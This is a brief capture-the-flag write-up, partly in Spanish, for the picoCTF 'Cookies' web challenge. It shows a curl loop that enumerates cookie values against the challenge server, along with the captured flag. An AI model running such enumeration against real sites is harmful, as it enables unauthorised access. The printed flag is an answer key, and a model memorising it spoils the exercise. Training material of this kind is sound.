## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)
## Solucion
yahirbalderas@Yahirs-MacBook-Pro ~ % for i in {0..30}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep "picoCTF{"

            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>

## Notas adicionales

## Referencias